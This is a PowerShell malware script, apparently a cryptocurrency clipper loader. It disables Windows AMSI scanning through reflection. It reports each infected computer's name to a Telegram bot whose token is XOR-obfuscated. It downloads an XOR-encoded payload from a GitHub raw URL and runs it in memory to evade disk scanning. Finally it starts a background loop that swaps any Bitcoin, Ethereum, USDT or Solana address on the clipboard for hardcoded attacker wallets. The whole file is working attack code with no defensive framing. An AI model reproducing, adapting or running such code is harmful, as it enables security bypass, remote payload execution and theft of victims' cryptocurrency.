# [AMSI_DETACH_SEQUENCE]
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$b.SetValue($null,[IntPtr]::Zero)

function Send-Notify {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($i in $t_e){$t+=[char]($i -bxor $k)}; $c=""; foreach($i in $c_e){$c+=[char]($i -bxor $k)}
    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

Send-Notify -m "V32_5_READY_$($env:COMPUTERNAME)"

try {
    # Load XORed payload from your provided file
    $p = "https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/adchar_xor.txt"
    $r = (New-Object Net.WebClient).DownloadString($p).Trim()
    $data = [Convert]::FromBase64String($r)
    for($i=0; $i -lt $data.count; $i++){ $data[$i] = $data[$i] -bxor 0xAB }
    
    # Reflective Load to bypass disk-scan
    [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, @(,[string[]]@()))

    # Clipper Logic
    $script = {
        Add-Type -AssemblyName System.Windows.Forms
        $wallets = @{
            "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
            "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
            "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
            "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
        }
        while($true){
            if([System.Windows.Forms.Clipboard]::ContainsText()){
                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $wallets.btc){[System.Windows.Forms.Clipboard]::SetText($wallets.btc)}}
                elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $wallets.eth){[System.Windows.Forms.Clipboard]::SetText($wallets.eth)}}
                elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $wallets.usdt){[System.Windows.Forms.Clipboard]::SetText($wallets.usdt)}}
                elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $wallets.sol){[System.Windows.Forms.Clipboard]::SetText($wallets.sol)}}
            }
            Start-Sleep -m 500
        }
    }
    [PowerShell]::Create().AddScript($script).BeginInvoke()
    Send-Notify -m "V32_5_CLIPIER_ACTIVE"
} catch {
    Send-Notify -m "V32_5_FATAL: $($_.Exception.Message)"
}
